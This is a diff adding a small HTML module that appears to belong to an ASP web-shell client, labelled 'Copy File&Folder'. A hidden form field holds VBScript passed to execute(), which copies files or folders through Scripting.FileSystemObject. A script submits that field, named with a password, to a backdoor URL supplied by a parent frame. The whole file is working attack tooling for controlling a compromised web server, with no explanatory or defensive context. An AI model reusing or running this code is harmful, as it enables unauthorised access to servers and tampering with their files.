@@ -1,0 +1,22 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Copy File&amp;Folder <br> 
+Folder like as <b>e:\myweb\</b> </div>
+<form method="post" name="xform" target="_blank">
+  <p>
+  From: 
+    <input name="pathf" type="text" id="pathf" value="e:\myweb\webadmin.aspx" size="40">
+    <br>
+    to:&nbsp;&nbsp;
+    <input name="patht" type="text" id="patht" value="f:\test.aspx" size="40">
+    <br>
+  <br>
+  <input type="hidden" name="code" value='execute("response.clear:Pathfr=request(""pathf""):Pathto=request(""patht""):StrResult=""Noop."":Set fso=CreateObject(""Scripting.FileSystemObject""):if right(Pathfr,1)=""\"" then:fso.CopyFolder mid(Pathfr,1,len(Pathfr)-1),Pathto:StrResult=""Copy Folder <b>""&Pathfr&""</b> to <b>""&Pathto&""</b> Success!"":else:fso.CopyFile Pathfr,Pathto:StrResult=""Copy File <b>""&Pathfr&""</b> to <b>""&Pathto&""</b> Success!"":end if:response.write(StrResult):response.end")'> 
+  </p>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
